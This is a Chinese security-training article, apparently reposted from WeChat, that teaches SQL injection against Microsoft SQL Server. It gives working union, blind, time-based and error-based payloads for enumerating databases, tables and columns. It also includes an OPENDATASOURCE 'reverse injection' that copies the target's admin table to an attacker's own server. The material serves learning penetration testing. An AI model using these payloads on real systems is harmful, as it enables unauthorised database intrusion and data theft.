> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/oV1fV1WvBWOL86AKcIwuFQ)

**高质量的安全文章，安全 offer 面试经验分享**

**尽在 # 掌控安全 EDU #**

一. 前置知识
-------

1.master：系统自带库，存储着所有的信息  
sysdatabae: 系统自带库中的表，存储着所有的库名  
![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcpQg4ufWoPSqGLBzsgoDXrvRLb01fuMIcgEDh2zRmmMeSGh3p4OeBNf15HiaRYSZEDpg1jCXfYrlPA/640?wx_fmt=png)  
name 表示库名，dbid 表示库的编号

2.sysobjects：每个库都有，系统库中的存储着所有的表名，其它库里的存着各自的表名  
![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcpQg4ufWoPSqGLBzsgoDXrvIC4jetQOkJ2TzOf0Vyx1I3kacwoH2xWXUVHtmEPAItDlG2mtLg79yA/640?wx_fmt=png)  
name 表示表名， 每个表有自己特有的 id， xtype 表示这个表的类型  
![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcpQg4ufWoPSqGLBzsgoDXrvP0ELc44Gfm2KIk1vh50ncibdQFGdrD4tnxQ8fTx8r3iayOfWliaXQJjBg/640?wx_fmt=png)

3.syscolumns：每个库都有，系统库中的存储着所有的字段名，其它库里的存着各自的字段名  
![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcpQg4ufWoPSqGLBzsgoDXrvQ0rBelOI9icaHJW4DX28uA0R0iaN3LvdAan7juoCibaS0T5FxZibVumUxQ/640?wx_fmt=png)  
name 表示字段名， 通过 id 判断该字段属于哪个表

4. 其它内容

```
注释是 --
select db_name(N),N为空表示当前数据库，可以通过修改数字查询其他数据库名
select user 查询当前用户
select @@version 查询数据库版本
```

二. 联合查询
-------

部分内容和`access`注入相似，毕竟是一家, 比如没有`limit`，可以使用`top`配合`desc`和`not in`等。  
判断回显点  
union select 1,2,3  
![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcpQg4ufWoPSqGLBzsgoDXrv1AibASia8WzeLlOIpGPz2qrh3ZyicyiaibWlSo4yNDmneD3YpP5AB2qAAvQ/640?wx_fmt=png)  
sqlserver 对字段的数据类型有要求，可以用 null 替代  
![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcpQg4ufWoPSqGLBzsgoDXrvavZ3QaXRyUd41R8xoxIibdicGLk4hevZqtnZsqNNZoGZIwrN9w7F0QCA/640?wx_fmt=png)  
但是如果让前表不显示，后面就不用了考虑字段数据类型  
![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcpQg4ufWoPSqGLBzsgoDXrvHsJOmsmMJuMHjUKH3AIAibOMoYYib2tVRW5Pq55YWWwhLtAQcrjpTMjQ/640?wx_fmt=png)  
查询表名  
指定`xtype`为`U`，表示用户的表

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcpQg4ufWoPSqGLBzsgoDXrv92gJ6QHnLfFTicDmcBicmEqJNUd4gnEg6uicxJPpCkxTO2IF5CHfrHbhg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcpQg4ufWoPSqGLBzsgoDXrv6oyibbicXdwheKEgZEQHpIFwHTdrNNCYuoB4UUoP9CoYWj90Sekib7OiaA/640?wx_fmt=png)  
查询字段名  
通过`id`指定表

```
SELECT * from users where id=1 and 1=2 union select top 1 1,2,name from sysobjects where id=1977058079
```

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcpQg4ufWoPSqGLBzsgoDXrv2dwmyXhHWRDianWXMzO9nueZCuFH8qR4gTNaX5pSibGiaPyNjR89tDkkg/640?wx_fmt=png)

三. 盲注
-----

相关函数

```
len 判断长度
substring 截取字符串
ascii 转换成ascii码
if 判断
WAITFOR DELAY '0:0:5' 延时5秒
```

1. 判断数据库个数

```
?id=1 and (select count(name) from master..sysdatabases)=7?id=1 and (select count(*) from master..sysdatabases where dbid=7)=1
```

2. 判断当前数据库长度

```
and len(db_name())=6
```

判断其它数据库长度

```
?id=1 and len(db_name(1))=6
```

3. 判断当前库名

```
?id=1 and substring(db_name(),1,1)='t'
```

4. 库中表的个数

```
?id=1 and (select count(name) from sysobjects where xtype='U')=5
```

5. 判断表内容  
当前库第一个表的长度

```
?id=1 and len((select top 1 name from sysobjects where xtype='U'))=5
```

判断第一个表的表名

```
?id=1 and substring((select top 1 name from test..sysobjects where xtype='U'),1,1)='u'
```

判断当前数据库第 2 个表的长度

```
?id=1 and len((select top 1 name from sysobjects where xtype='U' and name not in(select top 1 name from sysobjects where xtype='U')))=6
```

判断第二个表的表名

```
?id=1 and substring((select top 1 name from sysobjects where xtype='U' and name not in(select top 1 name from sysobjects where xtype='U')),1,1)='e'
```

6. 时间盲注

```
?id=1 IF SUBSTRING(DB_NAME(),1,1)='a' WAITFOR DELAY '0:0:5'
```

四. 报错注入
-------

报错注入  
在帮助文档里找了好多函数，好像都能报错

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcpQg4ufWoPSqGLBzsgoDXrvWa7LacmhlcKLpHOuzR0UW0F8NT9AjM4nwEia2gBtRrKqq6VbxkbrQEA/640?wx_fmt=png)

```
and convert(int,@@version)=1
```

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcpQg4ufWoPSqGLBzsgoDXrvkQIcE4zkEU9WX3tdVRw4XCkCtvQQiarjXgeia81agrYtS8VicRbjkEOpA/640?wx_fmt=png)

```
and db_name(@@version)=1
```

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcpQg4ufWoPSqGLBzsgoDXrvD7vtMUrZAY78p15nEbrsoeCCwNpicIXibwAba0asY9dKU2RU6nunFh7w/640?wx_fmt=png)

```
and file_name(db_name())=1
```

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcpQg4ufWoPSqGLBzsgoDXrvycxhW17icHlwNMd1PvWwCBOJLAsiaRcDRXlB4wsaQcUOiarub9B8CWjZQ/640?wx_fmt=png)

```
and col_name(@@SERVERNAME,db_name())=1
```

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcpQg4ufWoPSqGLBzsgoDXrvvQxbj6jnSSq06HtAThNEw3II3sJEYb06ibJbRvKnM9t52WU06BlwiaKg/640?wx_fmt=png)  
注意，col_name 需要两个参数，但是报错只能显示一个

```
and filegroup_name(db_name(1)=1
```

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcpQg4ufWoPSqGLBzsgoDXrvItyIDyAcyLNH21Pj4uzQqBdSGia6VcvIicZiblwvDth9oX1u4beOhl9nA/640?wx_fmt=png)

```
and PARSENAME(db_name(1),1)=1
```

注：还有好多，基本抓一个都能用，在帮助文档里输入`name`, 出来的函数都可以试一试

反弹注入

```
反弹注入
insert into opendatasource('sqloledb','server=mssql服务器地址（）,端口;
uid=账号;pwd=密码;database=数据库名').数据库名.dbo.表名 select * from admin
```

注意，创建的表需要和目标表的字段数相同，或者把`*`换成想要的字段。

  

**回顾往期内容**

[一起来学 PHP 代码审计（一）入门](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247487858&idx=1&sn=47c58061798afda9f50d6a3b838f184e&chksm=fa686803cd1fe115a3af2e3b1e42717dcc6d8751c888d686389f6909695b0ae0e1f4d58e24b3&scene=21#wechat_redirect)
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

[新时代的渗透思路！微服务下的信息搜集](https://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247487493&idx=1&sn=9ca65b3b6098dfa4d53a0d60be4bee51&chksm=fa686974cd1fe062500e5afb03a0181a1d731819f7535c36b61c05b3c6144807e0a76a0130c5&token=1892203713&lang=zh_CN&scene=21#wechat_redirect)
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

[反杀黑客 — 还敢连 shell 吗？蚁剑 RCE 第二回合~](https://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247485574&idx=1&sn=d951b776d34bfed739eb5c6ce0b64d3b&chksm=fa6871f7cd1ff8e14ad7eef3de23e72c622ff5a374777c1c65053a83a49ace37523ac68d06a1&token=1892203713&lang=zh_CN&scene=21#wechat_redirect)
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

[防溯源防水表—APT 渗透攻击红队行动保障](https://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247487533&idx=1&sn=30e8baddac59f7dc47ae87cf5db299e9&chksm=fa68695ccd1fe04af7877a2855883f4b08872366842841afdf5f506f872bab24ad7c0f30523c&token=1892203713&lang=zh_CN&scene=21#wechat_redirect)
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

[实战纪实 | 从编辑器漏洞到拿下域控 300 台权限](https://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247487476&idx=1&sn=ac9761d9cfa5d0e7682eb3cfd123059e&chksm=fa687685cd1fff93fcc5a8a761ec9919da82cdaa528a4a49e57d98f62fd629bbb86028d86792&token=1892203713&lang=zh_CN&scene=21#wechat_redirect)
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

![](https://mmbiz.qpic.cn/mmbiz_gif/BwqHlJ29vcqJvF3Qicdr3GR5xnNYic4wHWaCD3pqD9SSJ3YMhuahjm3anU6mlEJaepA8qOwm3C4GVIETQZT6uHGQ/640?wx_fmt=gif)

扫码白嫖视频 + 工具 + 进群 + 靶场等资料

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcpx1Q3Jp9iazicHHqfQYT6J5613m7mUbljREbGolHHu6GXBfS2p4EZop2piaib8GgVdkYSPWaVcic6n5qg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcqJvF3Qicdr3GR5xnNYic4wHWFyt1RHHuwgcQ5iat5ZXkETlp2icotQrCMuQk8HSaE9gopITwNa8hfI7A/640?wx_fmt=png)

 **扫码白嫖****！**

 **还有****免费****的配套****靶场****、****交流群****哦！**